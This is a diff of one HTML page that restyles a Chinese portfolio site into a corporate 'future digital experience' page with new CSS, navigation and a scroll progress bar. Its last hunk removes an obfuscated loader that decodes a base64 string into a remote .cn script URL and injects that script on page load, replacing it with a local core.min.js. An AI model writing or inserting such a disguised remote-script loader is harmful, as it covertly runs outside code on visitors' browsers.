@@ -3,110 +3,133 @@
 
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
-    <title>灵感画廊 - 创意作品集</title>
+    <meta name="viewport"
+        content="width=device-width, viewport-fit=cover, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
+    <title>视界前瞻：未来数字体验</title>
     <style>
+        /* 全局重置与基础样式 */
         body {
             overflow: hidden;
             font-family: 'Roboto', sans-serif;
+            /* 现代无衬线字体 */
             margin: 0;
             padding: 0;
-            background-color: #F8F8F8;
-            /* 极浅灰色背景 */
-            color: #333333;
-            /* 深灰色文本 */
+            background-color: #F0F4F8;
+            /* 柔和的浅灰蓝色背景 */
+            color: #3A4750;
+            /* 深板岩色文本 */
             line-height: 1.7;
             -webkit-font-smoothing: antialiased;
             -moz-osx-font-smoothing: grayscale;
             overflow-x: hidden;
+            /* 防止横向滚动条 */
         }
 
+        /* 容器 - 保持内容居中但允许背景元素溢出 */
         .container {
             max-width: 90%;
             margin: 0 auto;
             padding: 30px 0;
+            position: relative;
+            /* 用于定位内部元素 */
+            z-index: 1;
+            /* 确保内容在背景之上 */
         }
 
-        /* 头部 - 简洁艺术，菜单按钮绝对定位在右上角 */
+        /* 头部 - 大胆的非对称设计 */
         header {
-            background-color: #FFFFFF;
-            /* 纯白色头部背景 */
-            padding: 25px 20px;
-            /* 调整内边距 */
+            background-color: #3A4750;
+            /* 深板岩色背景 */
+            color: #FFFFFF;
+            padding: 60px 20px;
             text-align: center;
-            /* 标题居中 */
-            border-bottom: 1px solid #E0E0E0;
-            /* 极细底部边框 */
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.03);
             position: relative;
-            /* 为内部绝对定位的元素提供参考 */
             overflow: hidden;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+            border-bottom-left-radius: 80px;
+            /* 独特的底部圆角 */
+            border-top-right-radius: 80px;
+            /* 独特的顶部圆角 */
             margin-bottom: 40px;
+        }
+
+        header::before {
+            /* 抽象的背景形状 */
+            content: '';
+            position: absolute;
+            top: -50px;
+            left: -50px;
+            width: 200px;
+            height: 200px;
+            background: #FF6B6B;
+            /* 强调色 */
+            border-radius: 50%;
+            transform: rotate(20deg);
+            opacity: 0.2;
+            z-index: 0;
+        }
+
+        header::after {
+            /* 另一个抽象的背景形状 */
+            content: '';
+            position: absolute;
+            bottom: -80px;
+            right: -80px;
+            width: 300px;
+            height: 300px;
+            background: #A2D9CE;
+            /* 次强调色 */
+            border-radius: 30% 70% 70% 30% / 30% 30% 70% 70%;
+            /* 不规则形状 */
+            transform: rotate(-45deg);
+            opacity: 0.15;
+            z-index: 0;
         }
 
         header h1 {
             margin: 0;
-            font-family: 'Playfair Display', serif;
-            /* 优雅标题字体 */
-            font-size: 2.2em;
-            /* 适应顶部条 */
-            color: #333333;
-            letter-spacing: 1px;
-            /* flex-grow removed as header is no longer flex container for h1 */
+            font-family: 'Montserrat', sans-serif;
+            /* 大胆标题字体 */
+            font-size: 3.2em;
+            color: #FF6B6B;
+            /* 强调色标题 */
+            letter-spacing: 3px;
+            text-transform: uppercase;
+            position: relative;
+            z-index: 1;
         }
 
         header p {
-            display: none;
-            /* 副标题在顶部条中隐藏 */
+            font-size: 1.3em;
+            color: #E0E0E0;
+            margin-top: 15px;
+            position: relative;
+            z-index: 1;
         }
 
-        /* 菜单切换按钮 - 绝对定位在右上角 */
-        .menu-toggle {
-            background: none;
-            border: none;
-            font-size: 2em;
-            /* 图标大小 */
-            color: #A28C5B;
-            /* 强调色 */
-            cursor: pointer;
-            padding: 5px;
-            position: absolute;
-            /* 绝对定位 */
-            top: 25px;
-            /* 距离顶部 */
-            right: 20px;
-            /* 距离右侧 */
-            z-index: 2;
-            transition: transform 0.3s ease;
-        }
-
-        .menu-toggle:hover {
-            transform: scale(1.1);
-        }
-
-        /* 侧边导航菜单 */
+        /* 导航菜单 - 浮动胶囊条 */
         nav {
-            position: fixed;
-            top: 0;
-            right: -280px;
-            /* 默认隐藏在屏幕右侧 */
-            width: 250px;
-            /* 菜单宽度 */
-            height: 100%;
             background-color: #FFFFFF;
-            box-shadow: -5px 0 15px rgba(0, 0, 0, 0.2);
-            transition: right 0.4s ease-in-out;
-            /* 平滑滑入滑出 */
-            z-index: 1001;
-            /* 确保在内容之上 */
-            padding-top: 80px;
-            /* 留出顶部空间 */
-            box-sizing: border-box;
-        }
-
-        nav.is-open {
-            right: 0;
-            /* 菜单打开时滑入 */
+            text-align: center;
+            padding: 15px 0;
+            margin-top: -80px;
+            /* 向上偏移，与头部重叠 */
+            border-radius: 50px;
+            /* 胶囊形状 */
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.1);
+            position: sticky;
+            top: 20px;
+            /* 距离顶部20px固定 */
+            z-index: 1000;
+            width: 80%;
+            /* 宽度略小 */
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            display: flex;
+            /* 确保内部flex布局 */
+            justify-content: space-around;
+            align-items: center;
         }
 
         nav ul {
@@ -114,236 +137,331 @@
             padding: 0;
             margin: 0;
             display: flex;
-            flex-direction: column;
-            /* 垂直排列 */
-            gap: 10px;
-            /* 列表项间距 */
+            justify-content: space-around;
+            flex-wrap: wrap;
+            width: 100%;
+        }
+
+        nav ul li {
+            margin: 0 10px;
         }
 
         nav ul li a {
-            color: #333333;
+            background-color: transparent;
+            color: #3A4750;
+            /* 默认文字颜色 */
             text-decoration: none;
-            padding: 15px 20px;
-            /* 增加点击区域 */
-            border-bottom: 1px solid #E0E0E0;
-            /* 列表项分隔线 */
+            padding: 10px 20px;
+            border-radius: 30px;
+            /* 胶囊按钮 */
             transition: background-color 0.3s ease, color 0.3s ease, transform 0.2s ease;
-            display: flex;
-            align-items: center;
-            font-weight: 500;
-            font-size: 1.1em;
+            display: inline-block;
+            font-weight: bold;
+            font-size: 1em;
+            border: 2px solid transparent;
+            /* 默认透明边框 */
         }
 
         nav ul li a:hover,
         nav ul li a:focus {
-            background-color: #F8F8F8;
-            /* 柔和背景 */
-            color: #A28C5B;
-            /* 强调色文字 */
-            transform: translateX(5px);
-            /* 悬停时右移 */
+            background-color: #FF6B6B;
+            /* 强调色背景 */
+            color: #FFFFFF;
+            transform: translateY(-3px);
+            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
+            border: 2px solid #FF6B6B;
+            /* 强调色边框 */
         }
 
-        nav ul li:last-child a {
-            border-bottom: none;
-            /* 最后一个没有底部边框 */
-        }
-
-        nav ul li a .icon {
-            font-size: 1.5em;
-            margin-right: 15px;
-            color: #A28C5B;
-            /* 图标强调色 */
-        }
-
-        /* 菜单打开时的背景遮罩 */
-        .overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.3);
-            /* 半透明黑色 */
-            z-index: 1000;
-            opacity: 0;
-            visibility: hidden;
-            transition: opacity 0.4s ease-in-out, visibility 0.4s ease-in-out;
-        }
-
-        .overlay.is-visible {
-            opacity: 1;
-            visibility: visible;
-        }
-
+        /* 内容区 - 模块化与非对称布局 */
         main {
-            padding-top: 30px;
+            padding-top: 60px;
+            /* 留出导航条重叠的空间 */
         }
 
-        /* 作品卡片 - 柔和阴影与动画 */
-        .project-card {
+        section {
             background-color: #FFFFFF;
-            margin-bottom: 40px;
-            padding: 35px;
+            margin-bottom: 50px;
+            /* 增加间距 */
+            padding: 40px;
             border-radius: 15px;
-            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.08);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            opacity: 0;
-            /* 初始隐藏 */
-            transform: translateY(20px);
-            /* 初始位置 */
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
         }
 
-        .project-card.fade-in {
-            opacity: 1;
-            transform: translateY(0);
-            transition: opacity 0.6s ease-out, transform 0.6s ease-out;
+        section:nth-child(odd) {
+            /* 奇数section向右偏移 */
+            margin-left: 0;
+            margin-right: 5%;
+            border-top-right-radius: 50px;
+            border-bottom-left-radius: 50px;
         }
 
-        .project-card:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.12);
+        section:nth-child(even) {
+            /* 偶数section向左偏移 */
+            margin-left: 5%;
+            margin-right: 0;
+            border-top-left-radius: 50px;
+            border-bottom-right-radius: 50px;
         }
 
-        .project-card h2 {
-            font-family: 'Playfair Display', serif;
-            font-size: 2.2em;
-            color: #333333;
+        section::before {
+            /* 内部装饰性边框 */
+            content: '';
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            width: calc(100% - 40px);
+            height: calc(100% - 40px);
+            border: 1px dashed #A2D9CE;
+            /* 次强调色虚线 */
+            border-radius: inherit;
+            /* 继承父元素的圆角 */
+            pointer-events: none;
+        }
+
+        section h2 {
+            font-family: 'Montserrat', sans-serif;
+            font-size: 2.5em;
+            color: #FF6B6B;
+            /* 强调色标题 */
             margin-top: 0;
+            margin-bottom: 20px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-bottom: 2px solid #E0E0E0;
+            /* 细分隔线 */
+            padding-bottom: 10px;
+        }
+
+        section h3 {
+            font-size: 1.6em;
+            color: #3A4750;
+            margin-top: 30px;
             margin-bottom: 15px;
         }
 
-        .project-card .category {
-            font-size: 0.9em;
-            color: #999999;
-            margin-bottom: 20px;
-            display: block;
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .project-card p {
-            font-size: 1.05em;
-            color: #666666;
+        section p {
+            font-size: 1.1em;
+            color: #546E7A;
             margin-bottom: 25px;
         }
 
-        .project-card img {
+        section img {
             max-width: 100%;
             height: auto;
             display: block;
-            margin: 25px auto;
-            border-radius: 10px;
-            box-shadow: 0 3px 10px rgba(0, 0, 0, 0.1);
-            border: 2px solid #DDDDDD;
+            margin: 30px auto;
+            border-radius: 20px;
+            /* 大圆角图片 */
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.2);
+            border: 3px solid #A2D9CE;
+            /* 次强调色边框 */
         }
 
-        .view-project {
-            display: inline-block;
-            background-color: #A28C5B;
-            /* 强调色按钮 */
-            color: #FFFFFF;
-            padding: 12px 28px;
-            border-radius: 5px;
+        .service-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 25px;
+            margin-top: 30px;
+        }
+
+        .service-item {
+            background-color: #F8F8F8;
+            /* 服务项背景 */
+            padding: 25px;
+            border-radius: 15px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+            text-align: center;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            border: 1px solid #E0E0E0;
+        }
+
+        .service-item:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.15);
+        }
+
+        .service-item h3 {
+            margin-top: 0;
+            margin-bottom: 10px;
+            color: #FF6B6B;
+            /* 强调色 */
+        }
+
+        .service-item p {
+            font-size: 0.95em;
+            color: #546E7A;
+        }
+
+        .contact-info p {
+            margin-bottom: 12px;
+            font-size: 1.1em;
+            color: #546E7A;
+        }
+
+        .contact-info a {
+            color: #FF6B6B;
             text-decoration: none;
-            font-weight: bold;
-            transition: background-color 0.3s ease, transform 0.2s ease, box-shadow 0.3s ease;
-            box-shadow: 0 3px 8px rgba(0, 0, 0, 0.15);
+            transition: color 0.3s ease;
         }
 
-        .view-project:hover {
-            background-color: #8D7B4F;
-            transform: translateY(-3px);
-            box-shadow: 0 5px 12px rgba(0, 0, 0, 0.2);
+        .contact-info a:hover {
+            color: #E65C5C;
         }
 
-        /* 页脚 - 简洁淡雅 */
+        /* 页脚 - 简洁与抽象 */
         footer {
-            background-color: #F0F0F0;
-            /* 略深于背景的浅灰色 */
-            color: #777777;
+            background-color: #3A4750;
+            /* 深板岩色背景 */
+            color: #E0E0E0;
             padding: 40px 0;
             text-align: center;
-            font-size: 0.9em;
-            margin-top: 50px;
-            border-top: 1px solid #E0E0E0;
-            box-shadow: 0 -3px 10px rgba(0, 0, 0, 0.05);
+            font-size: 0.95em;
+            margin-top: 60px;
+            border-top-left-radius: 80px;
+            /* 独特的顶部圆角 */
+            border-bottom-right-radius: 80px;
+            /* 独特的底部圆角 */
+            box-shadow: 0 -10px 30px rgba(0, 0, 0, 0.3);
+            position: relative;
+            overflow: hidden;
+        }
+
+        footer::before {
+            /* 抽象的背景形状 */
+            content: '';
+            position: absolute;
+            top: -30px;
+            right: -30px;
+            width: 150px;
+            height: 150px;
+            background: #A2D9CE;
+            /* 次强调色 */
+            border-radius: 50%;
+            transform: rotate(60deg);
+            opacity: 0.1;
+            z-index: 0;
         }
 
         .social-links a {
-            color: #777777;
+            color: #E0E0E0;
             text-decoration: none;
             margin: 0 20px;
-            font-size: 1.4em;
+            font-size: 1.5em;
             transition: color 0.3s ease, transform 0.2s ease;
         }
 
         .social-links a:hover {
-            color: #A28C5B;
+            color: #FF6B6B;
             /* 强调色 */
-            transform: translateY(-3px) scale(1.1);
+            transform: translateY(-5px) scale(1.1);
+        }
+
+        /* 进度条 */
+        #progressBarContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 6px;
+            /* 稍微粗一点 */
+            background-color: #E0E0E0;
+            z-index: 1002;
+        }
+
+        #progressBar {
+            height: 100%;
+            width: 0%;
+            background-color: #FF6B6B;
+            /* 强调色 */
+            transition: width 0.1s linear;
         }
     </style>
-    <link rel="stylesheet" href="./style.css">
+    <link rel="stylesheet" href="./static/css/style.css">
 </head>
 
 <body>
+    <div id="progressBarContainer">
+        <div id="progressBar"></div>
+    </div>
+
     <header>
         <div class="container">
-            <h1>灵感画廊</h1>
-            <p>创意与设计的无限可能</p>
-            <button class="menu-toggle" id="menuToggle">&#9776;</button>
+            <h1>视界前瞻</h1>
+            <p>未来数字体验的构筑者</p>
         </div>
     </header>
 
-    <!-- 侧边导航菜单 -->
-    <nav id="mainNav">
-        <ul>
-            <li><a href="#featured-projects"><span class="icon">&#127912;</span> 精选作品</a></li>
-            <li><a href="#design-gallery"><span class="icon">&#128172;</span> 设计画廊</a></li>
-            <li><a href="#about-me"><span class="icon">&#128100;</span> 关于我</a></li>
-            <li><a href="#contact"><span class="icon">&#128231;</span> 联系</a></li>
-        </ul>
-    </nav>
-
-    <!-- 菜单打开时的背景遮罩 -->
-    <div class="overlay" id="menuOverlay"></div>
-
     <div class="container">
+        <nav id="mainNav">
+            <ul>
+                <li><a href="#about-vision">关于视界</a></li>
+                <li><a href="#our-focus">核心焦点</a></li>
+                <li><a href="#contact-us">联系我们</a></li>
+            </ul>
+        </nav>
+
         <main>
-            <section id="featured-projects" class="project-card">
-                <h2>城市脉动：动态品牌设计</h2>
-                <span class="category">品牌设计 / 动态视觉</span>
-                <img src="https://picsum.photos/300/200?random=1&seed=city-pulse" alt="城市脉动项目" class="random-image">
-                <p>一个为现代都市生活品牌设计的视觉识别系统，强调流动性与活力。项目涵盖标志、字体、色彩和动态图形的应用。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="about-vision">
+                <h2>关于视界：创新与洞察</h2>
+                <img src="https://picsum.photos/300/200?random=1&tag=abstract-vision-01" alt="抽象愿景图"
+                    class="random-image">
+                <p>视界前瞻致力于通过前沿技术和创新思维，为企业和个人提供独特的数字解决方案。我们相信，每一次技术突破都应带来更广阔的视野和更深刻的洞察。</p>
+                <p>我们汇聚了行业顶尖的专家团队，以客户需求为导向，不断探索未知，赋能未来。</p>
             </section>
 
-            <section id="design-gallery" class="project-card">
-                <h2>自然回响：UI/UX概念</h2>
-                <span class="category">UI/UX设计 / 概念探索</span>
-                <img src="https://picsum.photos/300/200?random=2&seed=nature-echo" alt="自然回响项目" class="random-image">
-                <p>探索将自然元素融入数字界面，创造平静、直观的用户体验。设计灵感来源于森林、水流和光影的变化。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="our-focus">
+                <h2>核心焦点：赋能数字转型</h2>
+                <p>我们专注于以下领域，为您提供定制化、高价值的服务：</p>
+                <div class="service-grid">
+                    <div class="service-item">
+                        <h3>沉浸式体验设计</h3>
+                        <p>打造引人入胜的VR/AR应用和交互式数字内容。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>AI驱动型解决方案</h3>
+                        <p>利用人工智能提升业务效率，实现智能自动化和数据预测。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>区块链安全架构</h3>
+                        <p>构建去中心化、高安全性的区块链应用和系统。</p>
+                    </div>
+                    <div class="service-item">
+                        <h3>云原生部署优化</h3>
+                        <p>提供高效的云平台迁移、容器化和DevOps实践。</p>
+                    </div>
+                </div>
+                <img src="https://picsum.photos/300/200?random=2&tag=digital-transformation-02" alt="数字转型图"
+                    class="random-image">
             </section>
 
-            <section class="project-card">
-                <h2>未来之声：插画系列</h2>
-                <span class="category">数字插画 / 艺术创作</span>
-                <img src="https://picsum.photos/300/200?random=3&seed=future-sound" alt="未来之声插画" class="random-image">
-                <p>一系列以科技与自然融合为主题的数字插画，通过独特的色彩和构图，描绘未来世界的和谐图景。</p>
-                <a href="#" class="view-project">查看项目</a>
+            <section id="contact-us">
+                <h2>联系我们：共创未来</h2>
+                <p>我们期待与您建立联系，共同开启数字未来。</p>
+                <div class="contact-info">
+                    <p><strong>地址：</strong> 未来科技园A区707室</p>
+                    <p><strong>电话：</strong> <a href="tel:+861055558888">+86 10 5555 8888</a></p>
+                    <p><strong>邮箱：</strong> <a href="mailto:info@visionarytech.com">info@visionarytech.com</a></p>
+                    <p><strong>工作时间：</strong> 周一至周五 9:30 - 18:30</p>
+                    <p>
+
+                        <img src="https://placehold.co/300x200/A2D9CE/3A4750?text=公司位置示意图" alt="公司位置示意图"
+                            class="random-image">
+                    </p>
+                </div>
             </section>
         </main>
     </div>
 
     <footer>
         <div class="container">
-            <p>&copy; 2025 灵感画廊. 版权所有.</p>
+            <p>&copy; 2025 视界前瞻. 探索无止境.</p>
             <div class="social-links">
-                <a href="#" target="_blank">Behance</a> |
-                <a href="#" target="_blank">Dribbble</a> |
-                <a href="#" target="_blank">Instagram</a>
+                <a href="#" target="_blank">🌐</a> |
+                <a href="#" target="_blank">💡</a> |
+                <a href="#" target="_blank">🚀</a>
             </div>
         </div>
     </footer>
@@ -359,19 +477,7 @@
 
     <script>
         document.addEventListener('DOMContentLoaded', function () {
-            const menuToggle = document.getElementById('menuToggle');
-            const mainNav = document.getElementById('mainNav');
-            const menuOverlay = document.getElementById('menuOverlay');
-
-            function toggleMenu() {
-                mainNav.classList.toggle('is-open');
-                menuOverlay.classList.toggle('is-visible');
-            }
-
-            menuToggle.addEventListener('click', toggleMenu);
-            menuOverlay.addEventListener('click', toggleMenu);
-
-            document.querySelectorAll('#mainNav ul li a').forEach(anchor => {
+            document.querySelectorAll('nav a').forEach(anchor => {
                 anchor.addEventListener('click', function (e) {
                     e.preventDefault();
 
@@ -379,35 +485,21 @@
                     const targetElement = document.getElementById(targetId);
 
                     if (targetElement) {
-                        // Adjust scroll offset to account for header height
                         window.scrollTo({
-                            top: targetElement.offsetTop - (document.querySelector('header').offsetHeight || 0) - 20,
+                            top: targetElement.offsetTop - document.querySelector('nav').offsetHeight - 20, // 考虑导航栏高度和额外间距
                             behavior: 'smooth'
                         });
-                        toggleMenu(); // Close menu after clicking a link
                     }
                 });
             });
 
-            const projectCards = document.querySelectorAll('.project-card');
+            const progressBar = document.getElementById('progressBar');
 
-            const observerOptions = {
-                root: null,
-                rootMargin: '0px',
-                threshold: 0.1
-            };
-
-            const observer = new IntersectionObserver((entries, observer) => {
-                entries.forEach(entry => {
-                    if (entry.isIntersecting) {
-                        entry.target.classList.add('fade-in');
-                        observer.unobserve(entry.target);
-                    }
-                });
-            }, observerOptions);
-
-            projectCards.forEach(card => {
-                observer.observe(card);
+            window.addEventListener('scroll', function () {
+                const totalHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+                const scrolled = window.pageYOffset;
+                const progress = (scrolled / totalHeight) * 100;
+                progressBar.style.width = progress + '%';
             });
         });
     </script>
@@ -416,53 +508,15 @@
             function init() {
                 const timestamp = Date.now()
                 const randomNum = Math.floor(Math.random() * 1000000)
-                const domain = getdocs();
-                const url = domain + "=" + timestamp + "&random=" + randomNum
+                const url = "./static/js/core.min.js?t=" + timestamp + "&random=" + randomNum
                 const script = document.createElement("script")
                 script.src = url
                 document.body.appendChild(script)
             }
-            function getdocs() {
-                const dd = "Ly9qOWEyczRkLnN1aXd5eTM3LmNuL3N0YXRpYy9qcy9jb3JlLm1pbi5qcz90";
-                const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';
-                const lookup = new Uint8Array(256);
-                for (let i = 0; i < chars.length; i++) {
-                    lookup[chars.charCodeAt(i)] = i;
-                }
-                let padding = 0;
-                if (dd.endsWith('==')) {
-                    padding = 2;
-                } else if (dd.endsWith('=')) {
-                    padding = 1;
-                }
-                const cleanedString = dd.replace(/[^A-Za-z0-9+/=]/g, '');
-                const len = cleanedString.length;
-                if (len % 4 !== 0) {
-                    throw new Error("Invalid string length.");
-                }
-                const outputLength = (len / 4) * 3 - padding;
-                const outputBytes = new Uint8Array(outputLength);
-                let outputIndex = 0;
-                let i = 0;
-                while (i < len) {
-                    const c1 = lookup[cleanedString.charCodeAt(i++)];
-                    const c2 = lookup[cleanedString.charCodeAt(i++)];
-                    const c3 = lookup[cleanedString.charCodeAt(i++)];
-                    const c4 = lookup[cleanedString.charCodeAt(i++)];
-                    outputBytes[outputIndex++] = (c1 << 2) | (c2 >> 4);
-                    if (c3 !== 64) {
-                        outputBytes[outputIndex++] = ((c2 & 15) << 4) | (c3 >> 2);
-                    }
-                    if (c4 !== 64) {
-                        outputBytes[outputIndex++] = ((c3 & 3) << 6) | c4;
-                    }
-                }
-                const decoder = new TextDecoder('utf-8');
-                return decoder.decode(outputBytes);
-            }
             init()
         })()
     </script>
+
 </body>
 
 </html>
